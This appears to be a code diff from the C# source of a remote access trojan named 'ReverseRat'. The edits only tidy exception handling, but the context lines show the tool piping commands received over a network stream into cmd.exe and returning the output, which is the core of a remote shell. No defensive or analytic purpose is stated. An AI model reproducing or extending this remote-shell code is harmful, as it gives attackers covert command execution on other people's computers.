@@ -118,7 +118,7 @@ namespace ReverseRat_Server_Console
                     streamReader = new StreamReader(networkStream);
                     streamWriter = new StreamWriter(networkStream);
                 }
-                catch (Exception err) { return; } //if no Client don't continue
+                catch { return; } //if no Client don't continue
 
                 processCmd = new Process();
                 processCmd.StartInfo.FileName = "cmd.exe";
@@ -144,7 +144,7 @@ namespace ReverseRat_Server_Console
                     processCmd.StandardInput.WriteLine(strInput);
                     strInput.Remove(0, strInput.Length);
                 }
-                catch (Exception err)
+                catch 
                 {
                     Cleanup();
                     break;
@@ -232,7 +232,7 @@ namespace ReverseRat_Server_Console
         private void Cleanup()
         {
             try { processCmd.Kill(); }
-            catch (Exception err) { };
+            catch { };
             streamReader.Close();
             streamWriter.Close();
             networkStream.Close();
@@ -256,7 +256,7 @@ namespace ReverseRat_Server_Console
                     streamWriter.WriteLine(strOutput);
                     streamWriter.Flush();
                 }
-                catch (Exception err) { }
+                catch { }
 
             }
         }
